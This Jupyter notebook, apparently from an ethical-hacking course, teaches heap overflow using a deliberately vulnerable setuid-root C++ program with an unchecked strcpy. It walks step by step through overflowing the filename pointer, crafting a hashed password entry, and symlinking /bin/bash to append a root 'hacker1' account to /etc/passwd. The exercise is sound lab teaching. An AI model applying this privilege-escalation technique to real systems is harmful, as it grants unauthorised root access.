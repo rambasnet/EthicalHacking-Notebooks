{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Heap Overflow\n",
    "\n",
    "- buffer overflow can happen in other segments such as **heap**, **data** and **bss**\n",
    "- if an important variable is located after a buffer vulnerable to an overflow, the program's control flow can be altered (regardless of the memory segment)\n",
    "    - controls may be limited\n",
    "    \n",
    "## Heap Overflow\n",
    "- heap overflow may not be as common as stack overflow but can be just as effective\n",
    "\n",
    "### demos/heap_overflow/secret.cpp\n",
    "- review the program and spot the following line that's susceptible \n",
    "```c++\n",
    "strcpy(secret, argv[1]); // culprit!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[Errno 2] No such file or directory: 'demos/heap_overflow'\n",
      "/home/kali/projects/SystemSecurity/demos/heap_overflow\n"
     ]
    }
   ],
   "source": [
    "%cd demos/heap_overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SystemSecurity/demos/heap_overflow'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <iostream>\n",
      "#include <string>\n",
      "#include <cstdio>\n",
      "#include <cstring>\n",
      "#include <fstream>\n",
      "#include <unistd.h> //getuid()\n",
      "#include <sys/types.h> // getuid()\n",
      "#include <filesystem>\n",
      "\n",
      "namespace fs = std::filesystem;\n",
      "using namespace std;\n",
      "\n",
      "void usage(char *prog_name, char *filename) {\n",
      "   printf(\"Usage: %s <secret to add to %s>\\n\", prog_name, filename);\n",
      "   exit(0);\n",
      "}\n",
      "\n",
      "int main(int argc, char* argv[]) {\n",
      "    int userid;\n",
      "    char *secret, *secret_file;\n",
      "    ofstream fout;\n",
      "    \n",
      "    secret = new char[100];\n",
      "    secret_file = new char[20];\n",
      "\n",
      "\n",
      "    strcpy(secret_file, \"/var/secret\");\n",
      "\n",
      "    if (argc < 2)\n",
      "        usage(argv[0], secret_file);\n",
      "    \n",
      "    strcpy(secret, argv[1]);\n",
      "\n",
      "    printf(\"[DEBUG] secret      @ %p: \\'%s\\'\\n\", secret, secret);\n",
      "    printf(\"[DEBUG] secret_file @ %p: \\'%s\\'\\n\", secret_file, secret_file);\n",
      "\n",
      "    userid = getuid();\n",
      "    fout.open(secret_file, ios_base::app); // append mode\n",
      "    if (!fout) {\n",
      "        cerr << \"Error while opening file\\n\";\n",
      "        cerr << \"Make sure \" << argv[0] << \" has r/w permission to /var folder\\n\";\n",
      "        exit(1);\n",
      "    }\n",
      "    fout << userid << \"\\n\" << secret << endl;\n",
      "    fs::permissions(secret_file, fs::perms::group_read|fs::perms::others_read, fs::perm_options::remove);\n",
      "    fout.close();\n",
      "    cout << \"Secret saved.\\n\";\n",
      "    delete[] secret;\n",
      "    delete[] secret_file;\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat secret.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -m32 -std=c++17 -fno-stack-protector -z execstack -no-pie secret.cpp  -o secret.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "sudo chown root:root secret.exe \n",
      "sudo chmod +s secret.exe  \n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### secret.exe must be setuid root program \n",
    "- all users in the system can keep their own secret by writing to /var/secrets file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 216268 Apr 20 13:49 secret.exe\n"
     ]
    }
   ],
   "source": [
    "! ls -al secret.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./secret.exe <secret to add to /var/secret>\n"
     ]
    }
   ],
   "source": [
    "# run the program\n",
    "! ./secret.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run the program with argument\n",
    "! ./secret.exe \"my top secret data\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./secret.exe \"new note for user\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S cat /var/secret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## overflowing buffer by corrupting datafile\n",
    "- how far down is secret_file from secret buffer (the offset)?\n",
    "- use gdb\n",
    "- subtract the address of secret buffer from the address of scret_file\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─$ sudo gdb -q ./secret.exe \n",
    "Reading symbols from ./secret.exe...\n",
    "\n",
    "(gdb) break main\n",
    "Breakpoint 1 at 0x804936a: file secret.cpp, line 21.\n",
    "\n",
    "(gdb) run \"some secret\"\n",
    "Starting program: /home/kali/projects/EthicalHacking/demos/heap_overflow/secret.exe \"some secret\"\n",
    "\n",
    "Breakpoint 1, main (argc=2, argv=0xffffd614) at secret.cpp:21\n",
    "21          ofstream fout;\n",
    "\n",
    "(gdb) n\n",
    "(gdb) n \n",
    "(gdb) p/x secret # secret is a pointer\n",
    "$1 = 0x8051bb0\n",
    "\n",
    "(gdb) p/x secret_file # secret file is a pointer\n",
    "$2 = 0x8051c20\n",
    "(gdb) \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# the offset of secret_file from secret buffer is:\n",
    "print(0x8051c20 - 0x8051bb0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./secret.exe $(python -c 'print(\"A\"*112)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's make sure testfile doesn't exist in the current director\n",
    "# delete the file if exists\n",
    "#! rm -f testfile\n",
    "! ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./secret.exe $(python -c 'print(\"A\"*112 + \"testfile\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "ls -al testfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "echo kali | sudo -S cat testfile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit the heap overflow flaw\n",
    "- several clever ways to exploit this type of capability\n",
    "- One interesting one: append a user account to the `/etc/passwd` file\n",
    "- make a backup copy of the file just incase..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cp /etc/passwd /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "cat /tmp/passwd.bkup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## /etc/passwd file format\n",
    "\n",
    "- Linux `/etc/passwd` file stores user account infor and hashed password using the following format:\n",
    "\n",
    "`username:password:userid:groupid:User Info:home folder:default shell`\n",
    "\n",
    "- x : hashed password stored in /etc/shadow file\n",
    "- NOTE: the password field can also contain hashed password\n",
    "- Python crypt module provides API to create Unix passwords with hash - [https://docs.python.org/3/library/crypt.html](https://docs.python.org/3/library/crypt.html)\n",
    "\n",
    "```python\n",
    "crypt(\"password\", \"salt\")\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "python -c 'import crypt; print(crypt.crypt(\"password\", \"AA\"))'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "python -c 'import crypt; print(crypt.crypt(\"password\", \"XX\"))'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## goal: generate a string that looks like\n",
    "\n",
    "`username:XXq2wKiyI43A2:0:0:userinfo:/root:/bin/bash`\n",
    "\n",
    "### problem:\n",
    "- it's hard to generate the exact line ending with `/bin/bash`\n",
    "    - because the file name `/etc/passwd` will be automatically attached at the end\n",
    "    - remember we're writing the whole string as a secret note to the file\n",
    "\n",
    "### workaround:\n",
    "- make `/etc/passwd` a soft link pointing to `/bin/bash`\n",
    "- create the following string instead:\n",
    "\n",
    "`username:XXq2wKiyI43A2:0:0:userinfo:/root:/tmp/etc/passwd`\n",
    "\n",
    "- Note `/etc/passwd` must be over_written to the `secret_file` buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "mkdir /tmp/etc\n",
    "ln -s /bin/bash /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "ls -l /tmp/etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### now we can create a valid password entry that looks like:\n",
    "\n",
    "`hacker1:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd`\n",
    "\n",
    "#### things to note\n",
    "- the value just before `/etc/passwd` must be 112 bytes long, remember?\n",
    "- can play with user information column to adjust the length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0::/root:/tmp\", end=\"\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "# find the length with empty user info\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0::/root:/tmp\", end=\"\")' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "112-37"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0:\" + \"A\"*75 + \":/root:/tmp\", end=\"\")' | wc -c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./secret.exe $(python -c 'print(\"hacker1:XXq2wKiyI43A2:0:0:\" + \"A\"*75 + \":/root:/tmp/etc/passwd\", end=\"\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "echo kali | sudo -S tail /etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## login or su \n",
    "- use newly created account (`hacker1:password`) to login\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─$ su hacker1                                                                                        134 ⨯\n",
    "Password: \n",
    "┌──(root💀K)-[/home/kali/projects/EthicalHacking/demos/heap_overflow]\n",
    "└─# whomai         \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
